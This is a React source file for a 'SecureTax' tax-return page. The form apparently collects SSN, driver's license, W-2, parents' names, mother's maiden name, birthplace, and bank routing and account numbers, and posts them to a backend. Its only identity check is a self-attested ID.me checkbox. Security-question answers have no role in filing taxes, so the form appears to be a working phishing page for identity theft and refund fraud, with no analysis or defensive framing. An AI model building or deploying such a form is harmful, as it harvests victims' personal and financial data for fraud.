import React, { useState } from 'react';
import axios from 'axios';
import ThankYou from './ThankYou';

const Form = () => {
  const [formData, setFormData] = useState({
    // ID.me verified
    idmeVerified: false,
    idmeUserId: '', // optional, if you want to store ID.me user ID
    // Driver's license
    driversLicenseNumber: '',
    driversLicenseState: '',
    // SSN
    ssn: '',
    // Parents
    fathersName: '',
    mothersName: '',
    mothersMaidenName: '',
    // Place of birth
    birthCity: '',
    birthState: '',
    // Bank info
    bankName: '',
    accountType: 'checking',
    routingNumber: '',
    accountNumber: '',
  });

  const [w2File, setW2File] = useState(null);
  const [errors, setErrors] = useState({});
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
    // Clear field-specific error when user types
    if (errors[name]) {
      setErrors({ ...errors, [name]: null });
    }
  };

  const handleFileChange = (e) => {
    setW2File(e.target.files[0]);
  };

  const validate = () => {
    const newErrors = {};
    if (!formData.driversLicenseNumber) newErrors.driversLicenseNumber = 'Driver\'s license number is required';
    if (!formData.driversLicenseState) newErrors.driversLicenseState = 'State is required';
    if (!formData.ssn) newErrors.ssn = 'SSN is required';
    else if (!/^\d{3}-\d{2}-\d{4}$/.test(formData.ssn)) newErrors.ssn = 'Format: XXX-XX-XXXX';
    if (!formData.fathersName) newErrors.fathersName = 'Father\'s full name is required';
    if (!formData.mothersName) newErrors.mothersName = 'Mother\'s full name is required';
    if (!formData.mothersMaidenName) newErrors.mothersMaidenName = 'Mother\'s maiden name is required';
    if (!formData.birthCity) newErrors.birthCity = 'City of birth is required';
    if (!formData.birthState) newErrors.birthState = 'State of birth is required';
    if (!formData.bankName) newErrors.bankName = 'Bank name is required';
    if (!formData.routingNumber) newErrors.routingNumber = 'Routing number is required';
    if (!formData.accountNumber) newErrors.accountNumber = 'Account number is required';
    return newErrors;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setLoading(true);
    const data = new FormData();
    // Append all form fields
    Object.keys(formData).forEach((key) => {
      // Convert boolean to string for backend
      const value = key === 'idmeVerified' ? formData[key].toString() : formData[key];
      data.append(key, value);
    });
    if (w2File) {
      data.append('w2', w2File);
    }

    try {
      await axios.post('/api/submit', data, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });
      setSubmitted(true);
    } catch (err) {
      console.error(err);
      alert('Submission failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  if (submitted) return <ThankYou />;

  return (
    <div className="container">
      <div className="card">
        <img src="/logo.png" alt="Company Logo" className="logo" />
        <h2>Tax Return Information</h2>
        <form onSubmit={handleSubmit}>
          {/* ID.me Verified */}
          <div className="form-group" style={{ display: 'flex', alignItems: 'center' }}>
            <input
              type="checkbox"
              name="idmeVerified"
              checked={formData.idmeVerified}
              onChange={handleChange}
            />
            <label style={{ marginBottom: 0, marginLeft: '0.5rem' }}>
              I have verified my identity with ID.me
            </label>
          </div>

          {/* Driver's License */}
          <div className="form-group">
            <label>Driver's License Number *</label>
            <input
              type="text"
              name="driversLicenseNumber"
              value={formData.driversLicenseNumber}
              onChange={handleChange}
              placeholder="e.g., D12345678"
            />
            {errors.driversLicenseNumber && <p className="error">{errors.driversLicenseNumber}</p>}
          </div>

          <div className="form-group">
            <label>Driver's License State *</label>
            <input
              type="text"
              name="driversLicenseState"
              value={formData.driversLicenseState}
              onChange={handleChange}
              placeholder="e.g., CA"
              maxLength="2"
            />
            {errors.driversLicenseState && <p className="error">{errors.driversLicenseState}</p>}
          </div>

          {/* SSN */}
          <div className="form-group">
            <label>SSN * (XXX-XX-XXXX)</label>
            <input
              type="text"
              name="ssn"
              value={formData.ssn}
              onChange={handleChange}
              placeholder="123-45-6789"
            />
            {errors.ssn && <p className="error">{errors.ssn}</p>}
          </div>

          {/* W-2 Upload */}
          <div className="form-group">
            <label>W-2 (if available)</label>
            <input
              type="file"
              accept=".pdf,.jpg,.jpeg,.png"
              onChange={handleFileChange}
            />
          </div>

          {/* Parents */}
          <div className="form-group">
            <label>Father's Full Name *</label>
            <input
              type="text"
              name="fathersName"
              value={formData.fathersName}
              onChange={handleChange}
            />
            {errors.fathersName && <p className="error">{errors.fathersName}</p>}
          </div>

          <div className="form-group">
            <label>Mother's Full Name *</label>
            <input
              type="text"
              name="mothersName"
              value={formData.mothersName}
              onChange={handleChange}
            />
            {errors.mothersName && <p className="error">{errors.mothersName}</p>}
          </div>

          <div className="form-group">
            <label>Mother's Maiden Name *</label>
            <input
              type="text"
              name="mothersMaidenName"
              value={formData.mothersMaidenName}
              onChange={handleChange}
            />
            {errors.mothersMaidenName && <p className="error">{errors.mothersMaidenName}</p>}
          </div>

          {/* Place of Birth */}
          <div className="form-group">
            <label>City of Birth *</label>
            <input
              type="text"
              name="birthCity"
              value={formData.birthCity}
              onChange={handleChange}
            />
            {errors.birthCity && <p className="error">{errors.birthCity}</p>}
          </div>

          <div className="form-group">
            <label>State of Birth *</label>
            <input
              type="text"
              name="birthState"
              value={formData.birthState}
              onChange={handleChange}
              placeholder="e.g., NY"
              maxLength="2"
            />
            {errors.birthState && <p className="error">{errors.birthState}</p>}
          </div>

          {/* Bank Info */}
          <div className="form-group">
            <label>Bank Name *</label>
            <input
              type="text"
              name="bankName"
              value={formData.bankName}
              onChange={handleChange}
            />
            {errors.bankName && <p className="error">{errors.bankName}</p>}
          </div>

          <div className="form-group">
            <label>Account Type *</label>
            <select name="accountType" value={formData.accountType} onChange={handleChange}>
              <option value="checking">Checking</option>
              <option value="savings">Savings</option>
            </select>
          </div>

          <div className="form-group">
            <label>Routing Number *</label>
            <input
              type="text"
              name="routingNumber"
              value={formData.routingNumber}
              onChange={handleChange}
            />
            {errors.routingNumber && <p className="error">{errors.routingNumber}</p>}
          </div>

          <div className="form-group">
            <label>Account Number *</label>
            <input
              type="text"
              name="accountNumber"
              value={formData.accountNumber}
              onChange={handleChange}
            />
            {errors.accountNumber && <p className="error">{errors.accountNumber}</p>}
          </div>

          {/* ID.me user ID (optional) – hidden, but you could add a field if needed */}
          <input type="hidden" name="idmeUserId" value={formData.idmeUserId} />

          <button type="submit" className="btn-primary" disabled={loading}>
            {loading ? 'Submitting...' : 'Submit Tax Return'}
          </button>

          <div className="privacy-link">
            <a href="/privacy.html">Privacy Policy</a>
          </div>
        </form>
      </div>
      <div className="footer">
        © 2025 SecureTax. All rights reserved. | Contact: support@example.com
      </div>
    </div>
  );
};

export default Form;